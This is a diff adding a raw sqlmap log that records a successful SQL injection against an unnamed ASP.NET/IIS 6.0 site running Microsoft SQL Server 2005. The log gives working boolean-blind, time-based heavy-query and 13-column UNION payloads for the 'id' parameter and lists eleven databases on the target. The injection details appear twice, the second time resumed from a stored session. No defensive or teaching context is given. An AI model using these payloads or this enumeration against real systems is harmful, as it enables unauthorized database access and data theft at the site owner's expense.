@@ -1,0 +1,49 @@
+sqlmap identified the following injection point(s) with a total of 153 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-4173 OR 7053=7053
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: id=143351858 AND 9926=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: id=143351858 UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(121)+CHAR(119)+CHAR(66)+CHAR(118)+CHAR(99)+CHAR(105)+CHAR(116)+CHAR(121)+CHAR(82)+CHAR(71)+CHAR(87)+CHAR(80)+CHAR(102)+CHAR(89)+CHAR(89)+CHAR(82)+CHAR(106)+CHAR(77)+CHAR(90)+CHAR(76)+CHAR(100)+CHAR(118)+CHAR(85)+CHAR(90)+CHAR(79)+CHAR(110)+CHAR(67)+CHAR(101)+CHAR(79)+CHAR(77)+CHAR(67)+CHAR(114)+CHAR(74)+CHAR(75)+CHAR(100)+CHAR(65)+CHAR(117)+CHAR(80)+CHAR(87)+CHAR(111)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: Microsoft SQL Server 2005
+available databases [11]:
+[*] AdventureWorksDW
+[*] hdrc22
+[*] job0881
+[*] kf
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] train
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-4173 OR 7053=7053
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: id=143351858 AND 9926=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: id=143351858 UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(121)+CHAR(119)+CHAR(66)+CHAR(118)+CHAR(99)+CHAR(105)+CHAR(116)+CHAR(121)+CHAR(82)+CHAR(71)+CHAR(87)+CHAR(80)+CHAR(102)+CHAR(89)+CHAR(89)+CHAR(82)+CHAR(106)+CHAR(77)+CHAR(90)+CHAR(76)+CHAR(100)+CHAR(118)+CHAR(85)+CHAR(90)+CHAR(79)+CHAR(110)+CHAR(67)+CHAR(101)+CHAR(79)+CHAR(77)+CHAR(67)+CHAR(114)+CHAR(74)+CHAR(75)+CHAR(100)+CHAR(65)+CHAR(117)+CHAR(80)+CHAR(87)+CHAR(111)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: Microsoft SQL Server 2005
